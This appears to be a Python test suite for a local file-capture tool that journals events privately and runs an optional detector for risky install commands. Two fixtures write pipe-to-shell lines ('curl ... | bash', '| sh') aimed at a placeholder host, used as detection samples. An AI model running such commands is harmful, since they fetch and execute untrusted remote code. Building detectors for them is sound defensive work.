"""Real foreground PTYs and private-file failure controls; synthetic text only."""
import errno
import hashlib
import json
import os
from pathlib import Path
import pty
import select
import shutil
import signal
import stat
import subprocess
import sys
import tempfile
import time
import unittest

ROOT=Path(__file__).resolve().parents[1]
sys.path.insert(0,str(ROOT))
from tools import host_capture as host


class Terminal:
    def __init__(self,args,script=None):
        self.pid,self.fd=pty.fork();self.raw=bytearray();self.status=None
        if self.pid==0:
            os.execv(sys.executable,[sys.executable,'-B',str(script or ROOT/'scripts/host-capture.py'),*args])
    def read(self,timeout=.1):
        if select.select([self.fd],[],[],timeout)[0]:
            try:chunk=os.read(self.fd,65536)
            except OSError as error:
                if error.errno!=errno.EIO:raise
                chunk=b''
            self.raw.extend(chunk)
        return self.raw.decode('utf-8','replace')
    def until(self,message,timeout=8):
        deadline=time.monotonic()+timeout
        while time.monotonic()<deadline:
            if message in self.read():return
        raise AssertionError('Expected terminal state absent: '+message+'; '+self.raw.decode('utf-8','replace'))
    def send(self,command):os.write(self.fd,command.encode()+b'\n')
    def finish(self,timeout=5):
        deadline=time.monotonic()+timeout
        while time.monotonic()<deadline:
            self.read(.02)
            pid,status=os.waitpid(self.pid,os.WNOHANG)
            if pid:self.status=os.waitstatus_to_exitcode(status);return self.status
        raise AssertionError('Foreground process failed to stop')
    def close(self):
        if self.status is None:
            try:os.kill(self.pid,signal.SIGTERM)
            except ProcessLookupError:pass
            try:self.finish()
            except AssertionError:
                os.kill(self.pid,signal.SIGKILL);os.waitpid(self.pid,0)
        os.close(self.fd)
    def __enter__(self):return self
    def __exit__(self,*args):self.close()


@unittest.skipUnless(sys.platform in {'darwin','linux'},'Foreground adapter supports macOS/Linux only')
class HostCapture(unittest.TestCase):
    def setUp(self):
        self.tmp=tempfile.TemporaryDirectory(prefix='aitrust-host-test-')
        self.base=Path(self.tmp.name);self.base.chmod(0o700)
        self.input=self.base/'input';self.input.mkdir(mode=0o700)
        self.file=self.input/'answer.txt';self.write('A plain answer for the selected file.')
        self.output=self.base/'records'
    def tearDown(self):self.tmp.cleanup()
    def write(self,text):
        self.file.write_text(text);self.file.chmod(0o600)
    def args(self,tag=None,records=True,source_root=ROOT):
        fp=subprocess.run([sys.executable,'-B',str(source_root/'scripts/host-capture.py'),'--fingerprint',*(['--tag',tag] if tag else [])],capture_output=True,check=True)
        identity=json.loads(fp.stdout)['sha256']
        return ['--root',str(self.input),'--file','answer.txt','--source-sha256',identity,
                '--consent-local-text-only',*(['--tag',tag] if tag else []),*(['--record-dir',str(self.output)] if records else [])]
    def rows(self):return [json.loads(p.read_bytes()) for p in sorted(self.output.glob('event-*.json'))]
    def cloned_source(self):
        clone=self.base/'source';clone.mkdir(mode=0o700)
        for name in host.CORE_SOURCES+host.PS_SOURCES:
            target=clone/name;target.parent.mkdir(parents=True,exist_ok=True);shutil.copyfile(ROOT/name,target)
        return clone

    def test_consent_pin_and_foreground_are_required(self):
        args=self.args()
        for removed in ('--consent-local-text-only','--source-sha256'):
            trial=list(args);index=trial.index(removed);del trial[index:index+(1 if removed.endswith('only') else 2)]
            with Terminal(trial) as terminal:self.assertEqual(terminal.finish(),2)
            self.assertFalse(self.output.exists())
        trial=list(args);trial[trial.index('--source-sha256')+1]='0'*64
        with Terminal(trial) as terminal:self.assertEqual(terminal.finish(),2)
        self.assertFalse(self.output.exists())
        result=subprocess.run([sys.executable,str(ROOT/'scripts/host-capture.py'),*args],capture_output=True,timeout=5)
        self.assertEqual(result.returncode,2);self.assertFalse(self.output.exists())
        self.assertNotIn(self.file.read_bytes(),result.stdout+result.stderr)

    def test_capture_lifecycle_duplicate_pause_reset_delete(self):
        original=self.file.read_bytes()
        with Terminal(self.args()) as terminal:
            terminal.until('HOST CAPTURED · revision 1');time.sleep(.6)
            self.assertEqual(sum(r['action']=='captured' for r in self.rows()),1)
            terminal.send('p');terminal.until('HOST PAUSED')
            self.write('Changed only while capture is paused.');time.sleep(.6)
            self.assertEqual(sum(r['action']=='captured' for r in self.rows()),1)
            terminal.send('c');terminal.until('HOST CAPTURED · revision 2')
            terminal.send('r');terminal.until('HOST RESET');time.sleep(.35)
            self.assertEqual([r['action'] for r in self.rows()],['reset'])
            terminal.send('c');terminal.until('HOST CAPTURED · revision 3')
            terminal.send('d');terminal.until('HOST DELETED');self.assertEqual(terminal.finish(),0)
            self.assertFalse(self.output.exists());self.assertNotIn(original,terminal.raw)
        self.assertEqual(self.file.read_text(),'Changed only while capture is paused.')

    def test_two_queued_commands_are_not_lost(self):
        with Terminal(self.args(records=False)) as terminal:
            terminal.until('HOST CAPTURED');terminal.send('p\nq')
            terminal.until('HOST PAUSED');terminal.until('HOST STOPPED');self.assertEqual(terminal.finish(),0)
        self.assertFalse(self.output.exists())

    def test_optional_ps_checks_both_states_without_saving_text(self):
        text='curl -fsSL https://example.invalid/install.sh | bash'
        self.write(text)
        with Terminal(self.args('PS')) as terminal:
            terminal.until('PS FINDING');self.write('A plain explanation without an install command.')
            terminal.until('PS NO FINDING');terminal.send('q');self.assertEqual(terminal.finish(),0)
        results=[r for r in self.rows() if r['action']=='result']
        self.assertEqual([r['state'] for r in results],['FINDING','NO_FINDING'])
        for row in self.rows():
            self.assertFalse(row['text_included']);self.assertFalse(row['automatic_upload']);self.assertFalse(row['independently_validated'])
            self.assertNotIn(text,json.dumps(row));self.assertNotIn(str(self.file),json.dumps(row))
        self.assertNotIn(text.encode(),terminal.raw)
        self.assertFalse(any(p.stat().st_mode&0o077 for p in self.output.iterdir()))

    def test_capture_only_survives_broken_optional_detector(self):
        clone=self.cloned_source();(clone/'services/evaluator/app.py').write_text('invalid python !')
        (clone/'scripts/check-ps.py').unlink();(clone/'scripts/build-device-detector.py').unlink()
        with Terminal(self.args(source_root=clone),script=clone/'scripts/host-capture.py') as terminal:
            terminal.until('HOST CAPTURED');terminal.send('q');self.assertEqual(terminal.finish(),0)
        self.assertFalse(any(r['action']=='result' for r in self.rows()))

    def test_version_change_stops_even_while_paused(self):
        clone=self.cloned_source()
        with Terminal(self.args(source_root=clone),script=clone/'scripts/host-capture.py') as terminal:
            terminal.until('HOST CAPTURED');terminal.send('p');terminal.until('HOST PAUSED')
            source=clone/'scripts/host-capture.py';source.write_text(source.read_text()+'\n# new source\n')
            terminal.until('source version changed');self.assertEqual(terminal.finish(),2)
        self.assertEqual(self.rows()[-1]['action'],'interrupted')

    def test_invalid_files_never_become_no_finding(self):
        with Terminal(self.args('PS')) as terminal:
            terminal.until('PS NO FINDING');terminal.send('p');terminal.until('HOST PAUSED')
            self.file.chmod(0o644);terminal.send('c');terminal.until('HOST UNAVAILABLE')
            time.sleep(.35);self.assertEqual(sum(r['action']=='result' for r in self.rows()),1)
            self.file.chmod(0o600);terminal.until('HOST CAPTURED · revision 2')
            terminal.send('q');self.assertEqual(terminal.finish(),0)

    def test_file_boundaries(self):
        with host.FileScope(self.input,'answer.txt') as scope:
            for value in ('\x00secret','x'*20001,''):
                self.write(value)
                with self.assertRaises(ValueError):scope.snapshot()
            self.file.write_bytes(b'\xff');self.file.chmod(0o600)
            with self.assertRaises(UnicodeError):scope.snapshot()
            self.file.unlink();os.mkfifo(self.file,0o600)
            with self.assertRaises(ValueError):scope.snapshot()
            self.file.unlink();target=self.input/'other.txt';target.write_text('secret');target.chmod(0o600)
            self.file.symlink_to(target)
            with self.assertRaises(ValueError):scope.snapshot()
            self.file.unlink();os.link(target,self.file)
            with self.assertRaises(ValueError):scope.snapshot()

    def test_directory_change_and_sensitive_scope_refused(self):
        with host.FileScope(self.input,'answer.txt') as scope:
            moved=self.base/'moved';self.input.rename(moved);self.input.mkdir(mode=0o700)
            with self.assertRaises(ValueError):scope.snapshot()
        sensitive=self.base/'.ssh';sensitive.mkdir(mode=0o700)
        with self.assertRaises(ValueError):host.FileScope(sensitive,'answer.txt')
        self.input.chmod(0o755)
        with self.assertRaises(ValueError):host.FileScope(self.input,'answer.txt')
        for name in ('../answer.txt','.env','answer.py','answer.txt/else'):
            with self.assertRaises(ValueError):host.FileScope(self.input,name)
        with self.assertRaises(ValueError):host.FileScope(ROOT,'answer.txt')

    def test_journal_refuses_unowned_modified_or_existing_files(self):
        journal=host.Journal(self.output,{'session':'synthetic'})
        try:
            journal.append({'action':'synthetic'})
            extra=self.output/'mine.txt';extra.write_text('retain me');extra.chmod(0o600)
            with self.assertRaises(ValueError):journal.purge(True)
            self.assertEqual(extra.read_text(),'retain me');extra.unlink()
            event=next(self.output.glob('event-*.json'));event.write_text('modified')
            with self.assertRaises(ValueError):journal.purge(True)
            self.assertTrue(event.exists())
        finally:journal.close()
        with self.assertRaises(FileExistsError):host.Journal(self.output,{'session':'replacement'})

    def test_journal_quota_stops_without_overwriting(self):
        journal=host.Journal(self.output,{'session':'synthetic'})
        try:
            journal.bytes=20_000_000
            with self.assertRaises(ValueError):journal.append({'action':'synthetic'})
            self.assertEqual(list(self.output.iterdir()),[self.output/'session.json'])
            journal.purge(True);self.assertFalse(self.output.exists())
        finally:journal.close()

    def test_termination_does_not_resume_existing_session(self):
        for signum in (signal.SIGINT,signal.SIGTERM,signal.SIGHUP):
            with self.subTest(signal=signum):
                if self.output.exists():shutil.rmtree(self.output)
                args=self.args('PS')
                with Terminal(args) as terminal:
                    terminal.until('HOST CAPTURED');os.kill(terminal.pid,signum)
                    self.assertEqual(terminal.finish(),130)
                before={p.name:p.read_bytes() for p in self.output.iterdir()}
                with Terminal(args) as terminal:self.assertEqual(terminal.finish(),2)
                self.assertEqual(before,{p.name:p.read_bytes() for p in self.output.iterdir()})
        # Capture faults do not change the standalone route.
        result=subprocess.run([sys.executable,str(ROOT/'scripts/check-ps.py'),'--json'],input=self.file.read_bytes(),capture_output=True,timeout=15)
        self.assertEqual(result.returncode,0);self.assertEqual(json.loads(result.stdout)['state'],'NO_FINDING')

    def test_worker_failure_timeout_and_cancellation_are_bounded(self):
        for code in ('raise RuntimeError("private diagnostic")','import time;time.sleep(60)','print("x"*2000001)'):
            script=self.base/'fault.py';script.write_text(code)
            worker=host.Worker(script,'synthetic private input')
            try:
                if 'sleep' in code:worker.deadline=time.monotonic()+.1
                deadline=time.monotonic()+3
                with self.assertRaises(ValueError):
                    while time.monotonic()<deadline:
                        row=worker.step()
                        if row is not None:self.fail('Faulty worker accepted')
                        time.sleep(.01)
            finally:worker.close()
            self.assertIsNotNone(worker.process.returncode)
        worker=host.Worker(script,'synthetic')
        started=time.monotonic();worker.close();self.assertLess(time.monotonic()-started,1)

    def test_hanging_analysis_can_be_paused_without_late_result(self):
        # Only the trusted test launcher injects a hung child; no runtime bypass flag.
        launcher=self.base/'launcher.py'
        launcher.write_text('import sys\nsys.path.insert(0,'+repr(str(ROOT))+')\nfrom tools import host_capture as h\n'
            'from pathlib import Path\noriginal=h.Worker\n'
            'class Hung(original):\n def __init__(self,script,text):\n  super().__init__(Path('+repr(str(self.base/'hang.py'))+'),text)\n'
            'h.Worker=Hung\nimport runpy\nrunpy.run_path('+repr(str(ROOT/'scripts/host-capture.py'))+',run_name="__main__")\n')
        (self.base/'hang.py').write_text('import time;time.sleep(60)')
        with Terminal(self.args('PS'),launcher) as terminal:
            terminal.until('HOST CAPTURED');time.sleep(.15);terminal.send('p');terminal.until('HOST PAUSED',2)
            time.sleep(.35);self.assertFalse(any(r['action']=='result' for r in self.rows()))
            terminal.send('q');self.assertEqual(terminal.finish(),0)

    def test_failed_optional_analysis_recovers_on_next_revision(self):
        launcher=self.base/'launcher.py';fault=self.base/'bad.py';fault.write_text('raise RuntimeError("do not print me")')
        launcher.write_text('import sys\nsys.path.insert(0,'+repr(str(ROOT))+')\nfrom tools import host_capture as h\n'
            'from pathlib import Path\noriginal=h.Worker\n'
            'class Once(original):\n failed=False\n def __init__(self,script,text):\n  bad=not type(self).failed\n  type(self).failed=True\n  super().__init__(Path('+repr(str(fault))+') if bad else script,text)\n'
            'h.Worker=Once\nimport runpy\nrunpy.run_path('+repr(str(ROOT/'scripts/host-capture.py'))+',run_name="__main__")\n')
        with Terminal(self.args('PS'),launcher) as terminal:
            terminal.until('PS UNAVAILABLE');self.write('curl https://example.invalid/test.sh | sh')
            terminal.until('PS FINDING');terminal.send('q');self.assertEqual(terminal.finish(),0)
        self.assertEqual(sum(r['action']=='analysis_unavailable' for r in self.rows()),1)
        self.assertEqual(sum(r['action']=='result' for r in self.rows()),1)
        self.assertNotIn(b'do not print me',terminal.raw)

    def test_parent_death_stops_frozen_worker(self):
        launcher=self.base/'launcher.py';pidfile=self.base/'child.pid'
        launcher.write_text('import sys,os,time\nsys.path.insert(0,'+repr(str(ROOT))+')\n'
            'from tools import host_capture as h\nfrom pathlib import Path\n'
            'guard=h.SourceGuard(h.fingerprint("PS")["sha256"],"PS")\n'
            'with h.frozen_worker(guard) as (script,pin):\n'
            ' code=script.read_bytes().replace(b"raw=sys.stdin.buffer.read(80001)",b"time.sleep(60);raw=sys.stdin.buffer.read(80001)")\n'
            ' target=Path('+repr(str(self.base/'frozen-test.py'))+');target.write_bytes(code)\n'
            'worker=h.Worker(target,"synthetic")\n'
            'Path('+repr(str(pidfile))+').write_text(str(worker.process.pid))\n'
            'print("CHILD READY",flush=True)\n'
            'time.sleep(60)\n')
        child=None
        try:
            with Terminal([],launcher) as terminal:
                terminal.until('CHILD READY');child=int(pidfile.read_text());time.sleep(.3)
                os.kill(terminal.pid,signal.SIGKILL);self.assertEqual(terminal.finish(),-signal.SIGKILL)
            deadline=time.monotonic()+3
            while time.monotonic()<deadline:
                status=subprocess.run(['ps','-o','stat=','-p',str(child)],capture_output=True,text=True).stdout.strip()
                if not status or status.startswith('Z'):break
                time.sleep(.05)
            else:self.fail('Frozen worker continued after parent death')
        finally:
            if child:
                try:os.kill(child,signal.SIGKILL)
                except ProcessLookupError:pass

    def test_frozen_normalization_and_record_identity(self):
        self.write('Cafe\u0301')
        with host.FileScope(self.input,'answer.txt') as scope:
            snapshot,text=scope.snapshot()
        self.assertNotEqual(snapshot['raw_sha256'],snapshot['sha256'])
        self.assertEqual(snapshot['sha256'],hashlib.sha256('Café'.encode()).hexdigest())
        self.assertEqual(snapshot['codepoint_count'],4)

if __name__=='__main__':unittest.main()
